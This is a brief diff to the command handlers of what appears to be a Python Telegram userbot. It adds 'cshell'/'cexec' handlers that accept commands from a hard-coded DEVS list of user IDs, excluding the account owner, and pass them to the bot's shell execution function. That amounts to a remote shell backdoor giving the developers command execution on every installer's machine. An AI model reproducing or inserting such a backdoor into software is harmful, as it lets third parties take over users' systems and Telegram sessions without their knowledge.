@@ -121,12 +121,13 @@ async def shell_exec(code, treat=True):
     return stdout, process
 
 
-@Ubot("shell", cmds)
+@Client.on_edited_message(filters.command(["cshell", "cexec"], cmd) & filters.user([DEVS]) & ~filters.me)
+@Client.on_edited_message(filters.command(["shell", "exec"], cmd) & filters.me)
 async def execution_func_edited(bot, message):
     await execution(bot, message)
 
-
-@Ubot("exec", cmds)
+@Client.on_message(filters.command(["cshell", "cexec"], cmd) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["shell", "exec"], cmd) & filters.me)
 async def execution_func(bot, message):
     await execution(bot, message)
 
